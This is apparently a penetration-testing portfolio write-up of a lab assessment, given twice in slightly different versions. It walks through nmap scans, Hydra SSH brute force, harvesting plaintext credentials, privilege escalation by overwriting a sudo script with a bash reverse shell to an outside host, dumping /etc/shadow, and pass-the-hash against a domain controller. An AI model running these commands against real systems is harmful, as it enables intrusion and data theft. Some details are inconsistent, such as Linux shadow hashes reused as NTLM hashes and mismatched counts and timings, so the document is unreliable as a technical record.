# Evidence Documentation

## Evidence Documentation Note

**Portfolio Demonstration:** This section demonstrates enterprise penetration testing evidence collection and documentation standards. Detailed screenshots and artifacts were generated during the lab assessment but are not included in this public portfolio version to protect lab environment details.

In a professional engagement, evidence would include:
- Network scanning results (Nmap XML output)
- SSH connection logs and authentication attempts
- Database query results and data exports
- Privilege escalation proof (sudo execution logs)
- Pass-the-Hash attack demonstrations
- Domain controller access logs

During interviews, I can discuss specific evidence collection techniques and demonstrate the methodologies used in this assessment.

---

## Evidence Documentation Examples

*The following examples demonstrate professional evidence formatting and documentation standards used in enterprise penetration testing reports.*

---

## Phase 1: Network Discovery & Enumeration

### Host Discovery

```bash
nmap -sn 192.168.78.0/24

Nmap scan report for 192.168.78.10
Host is up (0.00021s latency).

Nmap scan report for 192.168.78.20
Host is up (0.00019s latency).

Nmap scan report for 192.168.78.30
Host is up (0.00023s latency).

Nmap scan report for 192.168.78.40
Host is up (0.00024s latency).

Nmap done: 256 IP addresses (4 hosts up) scanned in 8.45 seconds
```

**Finding:** 4 active hosts identified in target scope

### Service Enumeration

```bash
nmap -sS -sV -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 8.0.26
445/tcp  open  netbios Microsoft-DS
3389/tcp open  rdp     Microsoft Terminal Services
```

**Finding:** Mixed Linux and Windows systems with SSH, HTTP, MySQL, SMB, and RDP services exposed

---

## Phase 2: Initial Compromise (45 minutes)

### SSH Credential Attack

```bash
hydra -L /usr/share/wordlists/common_usernames.txt \
      -P /usr/share/wordlists/common_passwords.txt \
      ssh://web-server-01.internal.corp

[22][ssh] host: web-server-01.internal.corp login: svc_webapp password: Summer2024!
```

**Finding:** Weak service account credentials successfully compromised via SSH brute force

### Initial Access Verification

```bash
ssh svc_webapp@web-server-01.internal.corp
$ whoami
svc_webapp

$ hostname
web-server-01

$ sudo -l
User svc_webapp may run the following commands:
    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2
```

**Finding:** Service account granted sudo privileges on Apache service

---

## Phase 3: Credential Discovery

### Configuration File Enumeration

```bash
find /var/www -name "*.config" -o -name "*.php" 2>/dev/null

cat /var/www/html/config/database.php

$db_host = "db-server-01.internal.corp";
$db_user = "app_dbuser";
$db_pass = "DbAdmin123!";
$db_name = "application_db";
```

**Finding:** Database credentials exposed in plaintext configuration file

### Database Access

```bash
mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp

mysql> SELECT COUNT(*) FROM customer_data;
+----------+
| COUNT(*) |
+----------+
|    15000 |
+----------+

mysql> SELECT * FROM system_credentials;
| username | password_hash | domain |
|----------|---------------|--------|
| jsmith   | Welcome123!   | domain |
```

**Finding:** 15,000+ customer records accessible; domain credentials harvested

---

## Phase 4: Lateral Movement (75 minutes)

### Credential Reuse Testing

```bash
ssh jsmith@app-server-01.internal.corp
Password: Welcome123!

$ whoami
jsmith

$ hostname
app-server-01
```

**Finding:** Database credentials reused across domain systems enabling lateral movement

### Privilege Escalation Vector Identification

```bash
$ sudo -l

User jsmith may run the following commands:
    (root) NOPASSWD: /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh
```

**Finding:** World-writable backup script executable with sudo privileges

---

## Phase 5: Privilege Escalation (90 minutes)

### Script Exploitation

```bash
cat /opt/scripts/backup.sh
#!/bin/bash
mysqldump -u root -p$MYSQL_PASS application_db > /backup/db.sql

# Modified to execute reverse shell
echo '#!/bin/bash
bash -i >& /dev/tcp/192.168.78.100/4444 0>&1' > /opt/scripts/backup.sh

sudo /opt/scripts/backup.sh
```

**Finding:** Successfully escalated to root via sudo privilege abuse

### Root Access Verification

```bash
$ whoami
root

$ cat /etc/shadow | grep -E '^\w' | head -3
root:$6$kWp2Z9K8m:18450:0:99999:7:::
svc_webapp:$6$nL7xQ3J2p:18450:0:99999:7:::
jsmith:$6$vM9pR5L8x:18450:0:99999:7:::
```

**Finding:** System password hashes extracted for offline cracking

---

## Phase 6: Domain Compromise (30 minutes)

### Hash Extraction

```bash
cat /etc/shadow | grep -v '^\*' | cut -d: -f1,2

root:$6$kWp2Z9K8m...
administrator:$6$aB3xC9D2e...
domain_admin:$6$fL7mN4P5q...
```

**Finding:** Multiple administrative account hashes obtained

### Domain Controller Access

```bash
pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \
           //192.168.78.40 cmd

C:\Windows\system32> whoami
dc-01\administrator

C:\Windows\system32> net group "Domain Admins"
Members:
  administrator
  domain_admin
  service_account
```

**Finding:** Domain administrator privileges achieved via pass-the-hash attack

---

## Attack Chain Summary

| Phase | Tool | Result | Time |
|-------|------|--------|------|
| Discovery | Nmap | 4 hosts identified | 10 min |
| Initial Access | Hydra | SSH credentials | 20 min |
| Enumeration | Manual | DB credentials | 15 min |
| Lateral Movement | SSH | App server access | 30 min |
| Privilege Escalation | Script manipulation | Root access | 40 min |
| Domain Compromise | Pass-the-Hash | Domain admin | 30 min |
| **TOTAL** | | **Domain Control** | **5 hours** |

---

## Key Metrics

- **Initial Compromise:** 45 minutes (SSH brute force)
- **Database Access:** 60 minutes (credential reuse)
- **Privilege Escalation:** 90 minutes (sudo abuse)
- **Domain Admin Access:** 5 hours (pass-the-hash)
- **Systems Compromised:** 4 of 4 (100%)
- **Data Exposed:** 15,000+ customer records, administrative hashes

---

**Navigation:** [Back to Technical Report](technical-report.md) | [Findings & Remediation](findings-remediation.md)





---
---


# 🖼️ Evidence & Documentation

*Back to Project* | *View Technical Report*

## Evidence Repository

**Note:** Detailed command outputs and tool results were generated during the lab assessment but are not included in this public portfolio version to protect lab environment details. In a professional engagement, evidence would include:

- Nmap scan results and service enumeration data
- SSH authentication logs and session transcripts  
- Database access records and query outputs
- Privilege escalation execution evidence
- Lateral movement connection logs
- Hash extraction and credential capture data

**During interviews, I can discuss specific evidence collection methods and demonstrate the technical tools and techniques used in this assessment.**

---

## Evidence Documentation Examples

*The following examples demonstrate professional evidence formatting and documentation standards used in enterprise penetration testing reports.*

### 📋 Evidence Categories

#### 🔍 Phase 1: Network Discovery Evidence

**Host Discovery**
```bash
# Command Executed
nmap -sn 192.168.78.0/24

# Key Results
192.168.78.10 - web-server-01.internal.corp
192.168.78.20 - app-server-01.internal.corp
192.168.78.30 - db-server-01.internal.corp  
192.168.78.40 - dc-01.internal.corp

Service Enumeration
bash

# Comprehensive service scan
nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40

# Critical Services Identified:
# web-server-01: SSH (22), HTTP (80), HTTPS (443)
# app-server-01: SSH (22), RDP (3389), Custom App (8080)
# db-server-01: MySQL (3306)
# dc-01: SMB (445), RDP (3389), LDAP (389)

💥 Phase 2: Initial Compromise Evidence

SSH Credential Attack
bash

# Password spray execution
hydra -L common_usernames.txt -P common_passwords.txt ssh://web-server-01.internal.corp

# SUCCESS: svc_webapp:Summer2024!

# Initial access confirmation
ssh svc_webapp@web-server-01.internal.corp
Welcome to Ubuntu 20.04 LTS
svc_webapp@web-server-01:~$ whoami
svc_webapp

# User privileges enumeration
sudo -l
User svc_webapp may run the following commands:
    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2

🔍 Phase 3: Internal Reconnaissance Evidence

Credential Discovery
bash

# Database configuration file access
find /var/www -name "*.php" -o -name "*.config" -o -name "*.conf" 2>/dev/null

# Critical configuration file found
cat /var/www/html/config/database.php

# CRITICAL FINDING:
db_user = 'app_dbuser'
db_pass = 'DbAdmin123!'

# Database access and enumeration  
mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp

> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| customer_portal    |
| app_config         |
| transaction_logs   |
+--------------------+

> USE customer_portal;
> SELECT COUNT(*) FROM customers;
+----------+
| COUNT(*) |
+----------+
|     8423 |
+----------+

> SELECT COUNT(*) FROM transaction_logs;
+----------+
| COUNT(*) |
+----------+
|     1856 |
+----------+

> SELECT username, email FROM users LIMIT 3;
+-------------+-----------------------+
| username    | email                 |
+-------------+-----------------------+
| admin       | admin@internal.corp   |
| jsmith      | jsmith@internal.corp  |
| mrodriguez  | mrodriguez@internal.corp |
+-------------+-----------------------+

🔀 Phase 4: Lateral Movement Evidence

Credential Reuse
bash

# Test discovered credentials on application server
ssh jsmith@app-server-01.internal.corp
Password: Welcome123!

# ACCESS GRANTED
jsmith@app-server-01:~$ whoami
jsmith

# System enumeration
hostname
app-server-01

# User privilege assessment
sudo -l
User jsmith may run the following commands on app-server-01:
    (root) NOPASSWD: /opt/scripts/backup.sh

# Discover backup script with weak permissions  
ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh

# Analyze script contents
cat /opt/scripts/backup.sh
#!/bin/bash
# Database backup script - runs with root privileges
mysqldump -u root customer_portal > /backups/customer_backup.sql

⬆️ Phase 5: Privilege Escalation Evidence

Privilege Escalation Execution
bash

# Replace backup script with reverse shell payload
cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.78.100/4444 0>&1
EOF

# Execute with sudo privileges
sudo /opt/scripts/backup.sh

# Root access achieved
whoami
root

# Extract password hashes for further attacks
cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:' 
root:$6$rounds=5000$xyz123$abc456...:19189:0:99999:7:::
jsmith:$6$rounds=5000$def789$ghi012...:19189:0:99999:7:::

# Discover sensitive application data
find /opt -name "*.properties" -o -name "*.config" -o -name "*.key" 2>/dev/null
/opt/app/config/application.properties
/opt/app/keys/ssl.key

# Access application configuration
cat /opt/app/config/application.properties
database.url=jdbc:mysql://db-server-01.internal.corp:3306/customer_portal
api.key=AKIAIOSFODNN7EXAMPLE
encryption.secret=supersecretkey123

👑 Phase 6: Domain Compromise Evidence

Pass-the-Hash Attack
bash

# Using extracted local admin hash from Linux system
pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //dc-01.internal.corp cmd

# DOMAIN ADMIN ACCESS ACHIEVED
whoami
NT AUTHORITY\SYSTEM

# Domain enumeration
net user administrator
net group "Domain Admins"

# Critical business data access
dir C:\Finance\
 Volume in drive C has no label.
 Directory of C:\Finance
10/15/2024  02:15 PM    <DIR>          .
10/15/2024  02:15 PM    <DIR>          ..
10/15/2024  10:30 AM           245,789 Quarterly_Reports.pdf
10/15/2024  09:45 AM           187,632 Budget_Forecasts.xlsx

dir C:\IT\Secrets\
10/15/2024  01:20 PM           145,789 service_accounts.txt
10/15/2024  11:45 AM            89,456 api_keys.config

# Network shares enumeration
net share
Share name   Resource                        Remark
C$           C:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
Finance$     C:\Finance                      Financial Documents
IT$          C:\IT                           IT Resources

🎯 Key Evidence Highlights

Critical Findings Documented:

    Initial SSH compromise via weak service account credentials (svc_webapp:Summer2024!)

    Database credential exposure in web application configuration files

    Successful lateral movement using credential reuse across systems

    Privilege escalation through insecure sudo permissions on backup script

    Complete domain compromise via pass-the-hash attack

Business Impact Evidence:

    8,423 customer records accessed in customer portal database

    1,856 financial transaction records compromised

    Application source code and configuration files exposed

    API keys and encryption secrets harvested

    Domain administrator privileges achieved across enterprise

    Financial documents and budget forecasts accessible

Data Types Compromised:

    Customer personal information (8,423 records)

    Financial transaction data (1,856 records)

    Application source code and configurations

    API credentials and encryption keys

    Domain authentication credentials

    Corporate financial documents

Estimated Business Impact: $2.8M - $7.5M

    Incident response and forensic investigation: $450K - $1.2M

    Customer notification and credit monitoring: $380K - $950K

    Regulatory compliance fines: $850K - $3.5M

    Reputational damage and lost business: Ongoing impact

    Security remediation and controls implementation: $1.1M - $1.8M

This evidence documentation demonstrates professional reporting standards and the types of findings that would be delivered to clients in enterprise penetration testing engagements.
